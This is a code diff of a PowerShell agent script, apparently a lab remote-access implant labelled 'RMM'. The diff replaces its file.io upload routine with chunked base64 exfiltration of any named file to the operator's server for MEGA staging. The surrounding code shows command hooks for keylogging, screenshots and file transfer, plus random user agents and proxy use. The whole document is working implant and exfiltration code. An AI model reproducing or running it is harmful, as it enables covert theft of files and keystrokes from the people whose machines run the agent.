@@ -56,8 +56,8 @@ $httpProxyUseDefaultCredentials = $false
 
 $verboseHttp = $false
 
-# file.io upload from agent (lab); max bytes before upload (default 100 MB).
-$fileIoMaxBytes = 104857600
+# MEGA upload via server staging (lab); max bytes before upload (default 100 MB).
+$megaMaxBytes = 104857600
 
 $script:RmmRegisterConfigSynced = $false
 
@@ -83,8 +83,8 @@ if ($env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS -and
     $env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS.Trim() -match '^(?i)(1|true|yes|on)$') {
     $httpProxyUseDefaultCredentials = $true
 }
-if ($env:RMM_FILEIO_MAX_BYTES -and $env:RMM_FILEIO_MAX_BYTES.Trim() -match '^\d+$') {
-    $fileIoMaxBytes = [long]$env:RMM_FILEIO_MAX_BYTES.Trim()
+if ($env:RMM_MEGA_MAX_BYTES -and $env:RMM_MEGA_MAX_BYTES.Trim() -match '^\d+$') {
+    $megaMaxBytes = [long]$env:RMM_MEGA_MAX_BYTES.Trim()
 }
 
 # -----------------------------------------------------------------------------
@@ -811,7 +811,7 @@ function Test-RmmInternalCommand {
     if ($c -match '^(?i)__STOP__$') { return $true }
     if ($c -match '^(?i)__CONFIG__\s') { return $true }
     if ($c -match '^(?i)__DOWNLOAD__\s') { return $true }
-    if ($c -match '^(?i)__FILEIO__\s') { return $true }
+    if ($c -match '^(?i)__MEGA__\s') { return $true }
     if ($c -match '^(?i)__UPLOAD__') { return $true }
     if ($c -match '^(?i)__SCREENSHOT__$') { return $true }
     if ($c -match '^(?i)__KEYLOG__\s') { return $true }
@@ -839,179 +839,111 @@ function Send-RmmTextResult {
     }
 }
 
-function Get-RmmFileIoExpiresTokens {
-    return @('1d', '2d', '3d', '7d', '14d', '1w', '2w', '1m', '2m', '3m', '6m', '1y')
-}
-
-function Parse-RmmFileIoCommand {
+function Parse-RmmMegaCommand {
     param([Parameter(Mandatory = $true)][string]$CommandLine)
-    $rest = $CommandLine.Substring(10).Trim()
-    if (-not $rest) {
-        return @{ FilePath = ''; Expires = '14d' }
+    if ($CommandLine -match '^(?i)__MEGA__\s+(.*)$') {
+        return @{ FilePath = $Matches[1].Trim() }
     }
-    $tokens = Get-RmmFileIoExpiresTokens
-    $parts = $rest -split '\s+'
-    if ($parts.Count -ge 2) {
-        $maybeExpires = $parts[-1].ToLowerInvariant()
-        if ($tokens -contains $maybeExpires) {
-            $path = ($parts[0..($parts.Count - 2)] -join ' ').Trim()
-            return @{ FilePath = $path; Expires = $maybeExpires }
-        }
-    }
-    return @{ FilePath = $rest; Expires = '14d' }
+    return @{ FilePath = '' }
 }
 
-function Invoke-RmmFileIoMultipartUpload {
+function Send-RmmMegaStaging {
     param(
         [Parameter(Mandatory = $true)][string]$FilePath,
-        [string]$Expires = '14d'
+        [string]$RemotePath = $FilePath,
+        [hashtable]$Headers = @{}
     )
-    $fileInfo = Get-Item -LiteralPath $FilePath
-    $maxBytes = [long]$fileIoMaxBytes
-    if ($fileInfo.Length -gt $maxBytes) {
-        throw "File size $($fileInfo.Length) exceeds file.io limit ($maxBytes bytes)"
-    }
-    $uri = "https://file.io/?expires=$([uri]::EscapeDataString($Expires))"
-    $boundary = [System.Guid]::NewGuid().ToString('N')
-    $fileName = $fileInfo.Name
-    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-    $headerText = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
-    $footerText = "`r`n--$boundary--`r`n"
-    $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($headerText)
-    $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footerText)
-    $bodyStream = New-Object System.IO.MemoryStream
+    $fileName = Split-Path $FilePath -Leaf
+    $uploadId = [guid]::NewGuid().ToString('N')
+    $chunkBytes = 6MB
+    $resultUrl = "$u/result?id=$sessionId&type=mega_staging"
+    $fs = [System.IO.File]::OpenRead($FilePath)
     try {
-        $bodyStream.Write($headerBytes, 0, $headerBytes.Length)
-        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
-        $bodyStream.Write($footerBytes, 0, $footerBytes.Length)
-        $bodyBytes = $bodyStream.ToArray()
-    } finally {
-        $bodyStream.Dispose()
-    }
-
-    Write-RmmLog "POST file.io upload ($($fileInfo.Length) bytes, expires=$Expires)" -Level DEBUG
-    $req = [System.Net.HttpWebRequest]::Create($uri)
-    $req.Method = 'POST'
-    $req.ContentType = "multipart/form-data; boundary=$boundary"
-    $req.ContentLength = $bodyBytes.Length
-    $req.Timeout = 600000
-    $req.ReadWriteTimeout = 600000
-    $req.UserAgent = Get-RandomUserAgent
-    if ($script:RmmWebProxy) {
-        $req.Proxy = $script:RmmWebProxy
-    }
-    $ws = $req.GetRequestStream()
-    try {
-        $ws.Write($bodyBytes, 0, $bodyBytes.Length)
-    } finally {
-        $ws.Close()
-    }
-    try {
-        $response = $req.GetResponse()
-    } catch [System.Net.WebException] {
-        $http = $null
-        if ($_.Exception.Response) {
-            $http = [System.Net.HttpWebResponse]$_.Exception.Response
-            $errBody = Get-RmmHttpErrorBody -Response $http
-            $status = [int]$http.StatusCode
-            throw "file.io HTTP $status`: $errBody"
+        $offset = [long]0
+        $fileLen = $fs.Length
+        if ($fileLen -eq 0) {
+            $payload = @{
+                filename     = $fileName
+                remote_path  = $RemotePath
+                upload_id    = $uploadId
+                offset       = 0
+                eof          = $true
+                content      = ''
+            } | ConvertTo-Json -Compress
+            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
+            return
         }
-        throw $_.Exception.Message
-    }
-    $httpResp = [System.Net.HttpWebResponse]$response
-    try {
-        $reader = New-Object System.IO.StreamReader($httpResp.GetResponseStream(), [System.Text.Encoding]::UTF8)
-        $raw = $reader.ReadToEnd()
-        $reader.Close()
+        while ($true) {
+            $buf = New-Object byte[] $chunkBytes
+            $n = $fs.Read($buf, 0, $chunkBytes)
+            if ($n -le 0) { break }
+            if ($n -lt $chunkBytes) {
+                $slice = New-Object byte[] $n
+                [Array]::Copy($buf, $slice, $n)
+                $b64 = [Convert]::ToBase64String($slice)
+            } else {
+                $b64 = [Convert]::ToBase64String($buf)
+            }
+            $eof = ($offset + $n) -ge $fileLen
+            $payload = @{
+                filename     = $fileName
+                remote_path  = $RemotePath
+                upload_id    = $uploadId
+                offset       = $offset
+                eof          = $eof
+                content      = $b64
+            } | ConvertTo-Json -Compress
+            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
+            $offset += $n
+            if ($eof) { break }
+        }
     } finally {
-        $httpResp.Close()
-    }
-    if (-not $raw.Trim()) {
-        throw 'file.io returned empty response'
-    }
-    try {
-        return $raw | ConvertFrom-Json
-    } catch {
-        throw "file.io returned non-JSON: $($raw.Substring(0, [Math]::Min(200, $raw.Length)))"
+        $fs.Dispose()
     }
 }
 
-function Send-RmmFileIoResult {
+function Send-RmmMegaErrorResult {
     param(
-        [hashtable]$Payload,
+        [string]$RemotePath,
+        [string]$ErrorMessage,
         [hashtable]$Headers = @{}
     )
-    $json = $Payload | ConvertTo-Json -Compress -Depth 6
-    $resultUrl = "$u/result?id=$sessionId&type=fileio_upload"
+    $payload = @{
+        type         = 'mega_upload'
+        remote_path  = $RemotePath
+        success      = $false
+        link         = $null
+        size         = 0
+        error        = $ErrorMessage
+    }
+    $json = $payload | ConvertTo-Json -Compress -Depth 6
+    $resultUrl = "$u/result?id=$sessionId&type=mega_upload"
     Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop | Out-Null
 }
 
-function Invoke-RmmFileIoUpload {
+function Invoke-RmmMegaUpload {
     param(
         [Parameter(Mandatory = $true)][string]$CommandLine,
         [hashtable]$Headers = @{}
     )
-    $parsed = Parse-RmmFileIoCommand -CommandLine $CommandLine
+    $parsed = Parse-RmmMegaCommand -CommandLine $CommandLine
     $filePath = $parsed.FilePath
-    $expires = $parsed.Expires
     if (-not $filePath) {
-        throw 'Missing remote file path in __FILEIO__ command'
+        throw 'Missing remote file path in __MEGA__ command'
     }
     if (-not (Test-Path -LiteralPath $filePath -PathType Leaf)) {
-        $payload = @{
-            type         = 'fileio_upload'
-            remote_path  = $filePath
-            success      = $false
-            link         = $null
-            key          = $null
-            expiry       = $null
-            size         = 0
-            error        = "File not found: $filePath"
-        }
-        Send-RmmFileIoResult -Payload $payload -Headers $Headers
-        return $payload
+        Send-RmmMegaErrorResult -RemotePath $filePath -ErrorMessage "File not found: $filePath" -Headers $Headers
+        return @{ success = $false; error = "File not found: $filePath"; link = $null }
     }
-    try {
-        $resp = Invoke-RmmFileIoMultipartUpload -FilePath $filePath -Expires $expires
-        $ok = $false
-        if ($null -ne $resp.success) { $ok = [bool]$resp.success }
-        elseif ($resp.link) { $ok = $true }
-        $link = [string]$resp.link
-        if (-not $link -and $resp.key) {
-            $link = "https://file.io/$($resp.key)"
-        }
-        $errMsg = $null
-        if (-not $ok) {
-            if ($resp.message) { $errMsg = [string]$resp.message }
-            elseif ($resp.error) { $errMsg = [string]$resp.error }
-            else { $errMsg = 'file.io upload failed' }
-        }
-        $payload = @{
-            type         = 'fileio_upload'
-            remote_path  = $filePath
-            success      = $ok
-            link         = $(if ($link) { $link } else { $null })
-            key          = $(if ($resp.key) { [string]$resp.key } else { $null })
-            expiry       = $(if ($resp.expiry) { [string]$resp.expiry } else { $null })
-            size         = $(if ($null -ne $resp.size) { [long]$resp.size } else { (Get-Item -LiteralPath $filePath).Length })
-            error        = $errMsg
-        }
-        Send-RmmFileIoResult -Payload $payload -Headers $Headers
-        return $payload
-    } catch {
-        $payload = @{
-            type         = 'fileio_upload'
-            remote_path  = $filePath
-            success      = $false
-            link         = $null
-            key          = $null
-            expiry       = $null
-            size         = 0
-            error        = [string]$_.Exception.Message
-        }
-        Send-RmmFileIoResult -Payload $payload -Headers $Headers
-        return $payload
+    $fileInfo = Get-Item -LiteralPath $filePath
+    if ($fileInfo.Length -gt $megaMaxBytes) {
+        $err = "File size $($fileInfo.Length) exceeds MEGA limit ($megaMaxBytes bytes)"
+        Send-RmmMegaErrorResult -RemotePath $filePath -ErrorMessage $err -Headers $Headers
+        return @{ success = $false; error = $err; link = $null }
     }
+    Write-RmmLog "Staging file for MEGA upload ($($fileInfo.Length) bytes): $filePath" -Level DEBUG
+    Send-RmmMegaStaging -FilePath $filePath -RemotePath $filePath -Headers $Headers
+    return @{ success = $true; link = $null; error = $null }
 }
 
 function Send-RmmFileDownload {
@@ -2052,17 +1984,17 @@ while ($true) {
                     Write-Host "[-] $errorMsg" -ForegroundColor Red
                 }
             }
-            elseif ($command -like "__FILEIO__ *") {
+            elseif ($command -like "__MEGA__ *") {
                 try {
-                    $fiResult = Invoke-RmmFileIoUpload -CommandLine $command -Headers $headers
-                    if ($fiResult.success -and $fiResult.link) {
-                        Write-Host "[+] Uploaded to file.io: $($fiResult.link)" -ForegroundColor Green
+                    $megaResult = Invoke-RmmMegaUpload -CommandLine $command -Headers $headers
+                    if ($megaResult.success) {
+                        Write-Host "[+] Staged for MEGA upload (link appears in operator transcript)" -ForegroundColor Green
                     } else {
-                        $err = if ($fiResult.error) { $fiResult.error } else { 'file.io upload failed' }
-                        Write-Host "[-] file.io upload failed: $err" -ForegroundColor Red
+                        $err = if ($megaResult.error) { $megaResult.error } else { 'MEGA upload failed' }
+                        Write-Host "[-] MEGA upload failed: $err" -ForegroundColor Red
                     }
                 } catch {
-                    $err = "file.io upload failed: $($_.Exception.Message)"
+                    $err = "MEGA upload failed: $($_.Exception.Message)"
                     Write-Host "[-] $err" -ForegroundColor Red
                 }
             }
